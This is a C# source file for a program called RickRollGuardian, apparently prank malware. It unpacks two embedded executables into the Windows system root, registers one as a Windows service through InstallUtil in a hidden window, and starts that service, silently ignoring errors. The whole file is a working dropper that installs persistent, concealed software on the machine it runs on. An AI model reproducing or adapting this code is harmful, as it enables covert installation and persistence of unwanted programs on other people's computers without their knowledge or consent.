using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using RickRollGuardian.Properties;

namespace RickRollGuardian {
    class Program {
        private static void ExtractFile(Stream resource, string path) {
            BufferedStream input = new BufferedStream(resource);
            FileStream output = new FileStream(path, FileMode.Create);
            byte[] data = new byte[1024];
            int lengthEachRead;
            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) {
                output.Write(data, 0, lengthEachRead);
            }
            output.Flush();
            output.Close();
        }

        private static void Main(string[] args) {
            string sysroot = Environment.GetEnvironmentVariable("SYSTEMROOT");
            string rickExe = sysroot + "\\rick.exe";
            string astleyExe = sysroot + "\\astley.exe";
            try {
                if (!File.Exists(rickExe)) ExtractFile(new MemoryStream(Resources.RickAstley), rickExe);
                if (!File.Exists(astleyExe)) ExtractFile(new MemoryStream(Resources.Astley_HelperSvc), astleyExe);
            }
            catch { }
            string scInstall = sysroot + "\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe";
            Process p = new Process();
            p.StartInfo.FileName = scInstall;
            p.StartInfo.Arguments = "\"" + astleyExe + "\" /LogFile=";
            p.StartInfo.UseShellExecute = true; //隐藏
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //隐藏
            p.Start();
            p.WaitForExit();
            ServiceController sc = new ServiceController("Astley_HelperSvc");
            if (sc.Status == ServiceControllerStatus.Stopped) {
                sc.Start();
                sc.Refresh();
            }
        }
    }
}
